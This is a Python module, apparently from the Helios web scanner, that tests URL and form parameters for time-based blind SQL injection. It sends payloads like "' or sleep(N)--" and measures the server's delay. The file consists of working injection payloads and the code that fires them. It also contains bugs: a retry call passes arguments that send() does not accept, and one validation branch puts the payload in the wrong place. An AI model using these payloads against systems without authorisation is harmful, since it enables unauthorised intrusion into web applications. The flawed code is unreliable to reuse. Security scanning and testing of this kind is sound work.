try:
    from urllib import quote_plus
except ImportError:
    from urllib.parse import quote_plus
import requests
import time
import random
import helios.modules.module_base
from helios.core.utils import requests_response_to_dict


class Module(helios.modules.module_base.Base):
    def __init__(self):
        self.name = "Blind SQL Injection (Time Based)"
        self.active = True
        self.module_types = ['injection', 'dangerous']
        self.possibilities = [
            '\' or sleep({sleep_value})--',
            '\' or sleep({sleep_value})\\*',
            '-1 or sleep({sleep_value})--',
            '-1 or sleep({sleep_value})\\*',
            'aaaaa\' or sleep({sleep_value}) or \'a\'=\''
        ]
        self.has_read_timeout = False
        self.timeout_state = 0
        self.max_timeout_state = 6  # 60 secs
        self.auto = True
        self.headers = {}
        self.cookies = {}
        self.input = "urldata"
        self.output = "vulns"
        self.severity = 3

    def run(self, url, data={}, headers={}, cookies={}):
        if not self.active and 'passive' not in self.module_types:
            # cannot send requests and not configured to do passive analysis on data
            return
        base, param_data = self.get_params_from_url(url)
        self.cookies = cookies
        self.headers = headers
        results = []
        if not data:
            data = {}
        for param in param_data:
            result = self.inject(base, param_data, data, parameter_get=param, parameter_post=None)
            if result:
                response, match = result
                results.append({'request': requests_response_to_dict(response), "match": match})

        for param in data:
            result = self.inject(base, param_data, data, parameter_get=None, parameter_post=param)
            if result:
                response, match = result
                results.append({'request': requests_response_to_dict(response), "match": match})
        return results

    def send(self, url, params, data):
        result = None
        headers = self.headers
        cookies = self.cookies
        start = time.time()
        # print(url, params, data)
        try:
            if data:
                result = requests.post(url, params=params, data=data, headers=headers, cookies=cookies)
            else:
                result = requests.get(url, params=params, headers=headers, cookies=cookies)
        except requests.Timeout:
            if self.has_read_timeout:
                if self.timeout_state > self.max_timeout_state:
                    self.close()
                    return None

                self.timeout_state += 1
                sleeptime = self.timeout_state * 10
                time.sleep(sleeptime)
                return self.send(url, params, data, headers, cookies)
            else:
                self.has_read_timeout = True
                self.timeout_state = 1
                sleeptime = self.timeout_state * 10
                time.sleep(sleeptime)
                return self.send(url, params, data, headers, cookies)
        except Exception:
            return False
        end = time.time()
        eslaped = end - start
        return eslaped, result

    def validate(self, url, params, data, injection_value, original_value, parameter_post=None, parameter_get=None):
        min_wait_time = random.randint(5, 10)
        injection_true = injection_value.replace('{sleep_value}', str(min_wait_time))
        injection_true = injection_true.replace('{original_value}', str(original_value))

        injection_false = injection_value.replace('{sleep_value}', str(0))
        injection_false = injection_false.replace('{original_value}', str(original_value))

        if parameter_get:
            tmp = dict(params)
            tmp[parameter_get] = injection_true
            result = self.send(url, params, tmp)
            if result:
                eslaped, object = result
                if eslaped > min_wait_time:
                    tmp = dict(params)
                    tmp[parameter_get] = injection_false
                    result = self.send(url, tmp, data)
                    if result:
                        eslaped, object = result
                        if eslaped < min_wait_time:
                            return object, eslaped
                        else:
                            return None
                else:
                    return None
        else:
            postenc = self.params_to_url("", data)[1:]
            tmp = dict(data)
            tmp[parameter_post] = injection_true
            result = self.send(url, params, tmp)
            if result:
                eslaped, object = result
                if eslaped > min_wait_time:
                    tmp = dict(params)
                    tmp[parameter_post] = injection_false
                    result = self.send(url, params, tmp)
                    if result:
                        eslaped, object = result
                        if eslaped < min_wait_time:
                            return object, eslaped
                    else:
                        return None
                else:
                    return None

    def inject(self, url, params, data=None, parameter_get=None, parameter_post=None):
        if parameter_get:
            tmp = dict(params)
            for injection_value in self.possibilities:
                min_wait_time = random.randint(5, 10)
                payload = injection_value.replace('{sleep_value}', str(min_wait_time))
                payload = payload.replace('{original_value}', str(params[parameter_get]))
                tmp[parameter_get] = payload
                result = self.send(url, tmp, data)
                if result:
                    eslaped, object = result
                    if eslaped > min_wait_time:
                        check_result = self.validate(url, params, data, injection_value, original_value=params[parameter_get], parameter_post=None,
                                      parameter_get=parameter_get)
                        if check_result:
                            return (object,
                                    {"injection": payload,
                                     "parameter": parameter_get,
                                     "location": "url",
                                     "server_sleep": eslaped
                                     })
            return False
        if parameter_post:
            tmp = dict(data)
            for injection_value in self.possibilities:
                min_wait_time = random.randint(5, 10)
                payload = injection_value.replace('{sleep_value}', str(min_wait_time))
                payload = payload.replace('{original_value}', str(data[parameter_post]))
                tmp[parameter_post] = payload
                result = self.send(url, params, tmp)
                if result:
                    eslaped, object = result
                    if eslaped > min_wait_time:
                        check_result = self.validate(url, params, data, injection_value, original_value=data[parameter_post], parameter_post=parameter_post,
                                      parameter_get=None)
                        if check_result:
                            return (object,
                                    {"injection": payload,
                                     "parameter": parameter_post,
                                     "location": "body",
                                     "server_sleep": eslaped
                                     })
            return False



